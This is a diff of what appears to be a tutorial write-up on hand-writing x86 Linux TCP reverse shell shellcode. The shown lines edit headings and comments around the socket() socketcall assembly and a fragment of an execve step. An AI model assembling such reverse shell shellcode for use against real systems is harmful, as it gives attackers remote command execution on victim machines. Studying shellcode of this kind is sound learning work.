@@ -19,8 +19,7 @@ _What is a reverse shell?_
 A reverse shell is a program that is executed on a victim device, and connects to a remote host. Once the victim connects to the remote host, the victim executes an interactive shell within the connection. Input and Output of the reverse shell program is passed to the remote host, allowing the remote host to execute commands as if they were physically connected to the terminal.  
 After writting the first bind shell, shellcode I felt I had a grasp on Assembly, and skipped right into creating the shellcode.  
 
-
-## 2. Create the Socket.
+## 1. Create the Socket.
 #### C Function
 ```c
 int socket(int domain, int type, int protocol);
@@ -31,9 +30,9 @@ int socket(int domain, int type, int protocol);
 EAX=0x66     EBX    ECX[0]     ECX[1]      ECX[2]
 ```  
 + `EAX = 0x66 = 102`
-  - SYSCAL `socketcall 102`
+  - System Call `socketcall 102`
 + `EBX = 0x1 = socket()`
-  - Value for syscal `socketcall` to create a socket
+  - Value of EBX Register for `socketcall` to create a new socket.
 + `ECX[0] = int domain = AF_INET = PF_INET = 0x2`
   - Finding the value for `PF_INET`.  
 ```console
@@ -49,9 +48,9 @@ cat /usr/include/i386-linux-gnu/bits/socket.h
 ```nasm
 xor eax, eax  ; Clear EAX Register. EAX = 0x00000000
 mov al, 0x66  ; EBX = 0x66 = 102. SYSCAL 102 = socketcall
-xor ebx, ebx  ; Clear EBX Register. EBX = 0x00000000
+xor ebx, ebx  ; Clear EBX Register. 
 inc ebx	      ; EBX = 0x1 = socket() // Create a socket
-xor ecx, ecx  ; Clear ECX Register. ECX = 0x00000000
+xor ecx, ecx  ; Clear ECX Register. 
 push ecx      ; ECX[2] = int protocol = 0. Pushes 0x0 onto the stack
 push ebx      ; ECX[1] - int type = SOCK_STREAM = 0x1. Pushes 0x1 onto the stack
 push byte 0x2 ; ECX[0] - int domain = AF_INET = PF_INET = 0x2. Pushes 0x2 onto the stack
@@ -158,10 +157,8 @@ xor ecx, ecx
 int 0x80         ; execute execve
 ```
 
-
-
-
 ## Complete Assembly Code for TCP Reverse Shell Shellcode
+
 ```nasm
 ; Filename: revTcpSh.asm
 ; Author: boku
